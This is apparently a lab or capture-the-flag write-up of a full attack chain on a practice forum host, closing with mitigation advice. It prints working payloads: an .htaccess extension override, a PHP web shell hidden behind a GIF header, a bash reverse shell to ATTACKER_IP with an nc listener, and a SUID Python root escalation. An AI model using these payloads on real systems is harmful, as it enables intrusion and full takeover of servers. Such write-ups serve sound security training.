# Full Compromise: Core Forum - RCE to Root

## üéØ Objective
Infiltrate a malicious hacker forum by exploiting file upload vulnerabilities to achieve Remote Code Execution (RCE) and perform privilege escalation to `root`.

## üîç Vulnerability Analysis
- **Primary Flaw:** Unrestricted File Upload leading to code execution.
- **Bypass Technique:** `.htaccess` configuration override to define a custom executable extension (`.bypass`).
- **Target:** `http://coreforum.hv`

## üí• Exploitation Chain

### Phase 1: Web Shell Upload
1.  **Configuration Bypass:** Uploaded `.htaccess` with `AddType application/x-httpd-php .bypass`.
2.  **Payload Delivery:** Uploaded a PHP web shell with a GIF header (`GIF89a;<?php system($_GET['cmd']); ?>`) renamed to `file.bypass`.
3.  **Verification:** Confirmed RCE via `http://coreforum.hv/uploads/file.bypass?cmd=id`.

### Phase 2: Reverse Shell Establishment
- **Listener:** `nc -lnvp 4444`
- **Payload:** `bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'` (URL encoded and executed via the web shell).
- **Result:** Gained a low-privileged shell as user `www-data`.

### Phase 3: Privilege Escalation to Root
- **Discovery:** Found SUID binary `/usr/bin/python3.9`.
- **Exploit:** Leveraged Python's `os` module to set UID to 0.
    ```bash
    /usr/bin/python3.9 -c "import os;os.setuid(0);os.system('bash')"
    ```
- **Result:** Achieved `root` access on the target system.

## üõ°Ô∏è Mitigation Strategies
1.  **Disable `.htaccess` Overrides:** Configure Apache with `AllowOverride None` in upload directories.
2.  **File Upload Hardening:** Implement file extension whitelisting, MIME type verification, and content inspection.
3.  **Principle of Least Privilege:** Remove the SUID bit from interpreters like Python, PHP, and Perl. Regularly audit SUID binaries.

## üìä Skills Demonstrated
- **Advanced Upload Bypasses:** Exploiting server misconfiguration via `.htaccess`.
- **Post-Exploitation:** Stabilizing shells and conducting local enumeration.
- **Privilege Escalation:** Identifying and exploiting misconfigured SUID binaries.
- **Full Attack Chain Execution:** Moving from external web attack to full system compromise.

*Conducted in a controlled, authorized lab environment for educational purposes.*
